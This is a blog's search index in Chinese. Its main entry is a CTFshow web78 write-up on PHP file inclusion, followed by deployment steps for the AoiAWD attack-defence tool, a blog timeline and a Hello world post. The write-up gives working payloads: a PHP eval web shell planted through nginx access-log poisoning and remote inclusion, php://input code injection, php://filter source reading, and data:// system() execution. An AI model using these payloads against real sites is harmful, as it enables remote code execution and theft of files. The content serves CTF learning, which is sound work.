<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>php文件包含-CTFshow-web78</title>
      <link href="b1c7d97662f2/"/>
      <url>b1c7d97662f2/</url>
      
        <content type="html"><![CDATA[<ul><li>常见的 php 伪协议对照表：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210705222420.png"></li><li>PHP官方支持的协议和封装协议：<a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a><br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711200624.png"></li></ul><h1 id="1-file-或-不使用协议"><a href="#1-file-或-不使用协议" class="headerlink" title="1 file:// 或 不使用协议"></a>1 file:// 或 不使用协议</h1><p>（将文件直接读入，无法进行编码，会被 php 执行）</p><blockquote><p> 包含一句话木马，实现代码执行来读取 flag。</p></blockquote><ul><li>访问URL<code>http://21da7ba4-6818-45bc-903a-7eb4c78a3284.challenge.ctf.show:8080/?file=file:///var/log/nginx/access.log</code>，来确定是否能读取 nginx 的日志。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711201751.png"></li><li>确定可以访问 nginx 的日志后。使用Burp进行抓包，并修改 User-Agent 为 <code>&lt;?php @eval($_GET[code]);echo PHP_DATADIR;?&gt;</code><br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711201934.png"></li><li>再次访问 <code>http://21da7ba4-6818-45bc-903a-7eb4c78a3284.challenge.ctf.show:8080/?file=file:///var/log/nginx/access.log</code> 即可查看 PHP 的执行路径。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711202157.png"></li><li>访问URL<code>view-source:http://21da7ba4-6818-45bc-903a-7eb4c78a3284.challenge.ctf.show:8080/?file=file:///var/log/nginx/access.log&amp;code=system(&#39;cat flag.php&#39;);</code>，即可看到flag<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711202332.png"></li></ul><h1 id="2-http"><a href="#2-http" class="headerlink" title="2 http://"></a>2 http://</h1><blockquote><p>远程文件包含，实现代码执行来读取 flag。</p></blockquote><ul><li>创建远程文件，写入一句话木马。url为<code>https://blog-1256032382.cos.ap-nanjing.myqcloud.com/eval.php</code>。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[code]);<span class="keyword">echo</span> PHP_DATADIR;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>访问URL<code>view-source:http://21da7ba4-6818-45bc-903a-7eb4c78a3284.challenge.ctf.show:8080/?file=https://blog-1256032382.cos.ap-nanjing.myqcloud.com/eval.php&amp;code=system(&#39;cat flag.php&#39;);</code>即可获得 flag<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711202803.png"></li></ul><h1 id="3-php"><a href="#3-php" class="headerlink" title="3 php://"></a>3 php://</h1><h2 id="3-1-php-input"><a href="#3-1-php-input" class="headerlink" title="3.1 php://input"></a>3.1 php://input</h2><ul><li>使用 Burp 进行抓包，修改 file 参数为 <code>php://input</code>，在下方添加 POST 参数为 <code>&lt;?php @eval($_GET[code]);echo PHP_DATADIR;?&gt;</code>。如下图所示<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711203050.png"></li><li>修改GET参数为<code>/?file=php://input&amp;code=system(&#39;cat%20flag.php&#39;);</code><br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711203235.png"></li></ul><h2 id="3-2-php-filter"><a href="#3-2-php-filter" class="headerlink" title="3.2 php://filter"></a>3.2 php://filter</h2><ul><li>访问URL<code>http://21da7ba4-6818-45bc-903a-7eb4c78a3284.challenge.ctf.show:8080/?file=php://filter/convert.base64-encode/resource=flag.php</code>。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711203715.png"></li><li>对返回的Base64值进行解码，即可获得 flag<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711203815.png"></li></ul><h1 id="4-zlib"><a href="#4-zlib" class="headerlink" title="4 zlib://"></a>4 zlib://</h1><p>同 <code>file://</code></p><h1 id="5-data"><a href="#5-data" class="headerlink" title="5 data://"></a>5 data://</h1><ul><li>访问 URL<code>http://21da7ba4-6818-45bc-903a-7eb4c78a3284.challenge.ctf.show:8080/?file=data:text/plain,&lt;?php system(&#39;base64 flag.php&#39;);?&gt;</code>。</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210711204543.png"></p><ul><li>解码返回的 Base64，即可得到flag。<blockquote><p>当然可以使用 data 的其他变形。例如：<code>data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code></p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开源项目-AoiAWD一键部署</title>
      <link href="c5c098b97076/"/>
      <url>c5c098b97076/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Note：guardian.phar、tapeworm.phar、roundworm等文件将会在部署时保存到当前目录下的 tmp 文件夹中。</p></blockquote><ul><li><p>下载源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/slug01sh/AoiAWD</span><br></pre></td></tr></table></figure></li><li><p>构建镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure></li><li><p>部署镜像（不建议直接使用 -d，需要查看网站密钥和运行情况）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure></li><li><p>关闭并清理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure></li></ul><p>演示视频（OSX 11）：<br><a href="https://asciinema.org/a/424571"><img src="https://asciinema.org/a/424571.svg" alt="asciicast"></a></p><ul><li>常用命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chmod +x guardian.phar</span><br><span class="line">chmod +x tapeworm.phar</span><br><span class="line">chmod +x roundworm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数含义请查看：https://github.com/slug01sh/AoiAWD#guardian</span></span><br><span class="line">./guardian.phar -i /var/www/html -s 10.211.55.3:8023</span><br><span class="line">./tapeworm.phar -d /var/www/html -s 10.211.55.3:8023</span><br><span class="line">./roundworm  -w /var/www/html -s 10.211.55.3 -p 8023 -d</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>blog的时间线</title>
      <link href="e3bb9d03d772/"/>
      <url>e3bb9d03d772/</url>
      
        <content type="html"><![CDATA[<ul><li>2020年9月14日：开始写 blog，断断续续更新，更新内容有 CTF、英语、计算机基础，行文散乱。</li><li>2021年1月4日：开始提高更新频率，但都只是些随笔，甚至是草稿，没有自己的思想。</li><li>2021年7月4日：将前面的博文归档到本地，开始每周日更新一篇 CTF 相关的博文。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello world</title>
      <link href="2728c2e57855/"/>
      <url>2728c2e57855/</url>
      
        <content type="html"><![CDATA[<p>Hello world</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
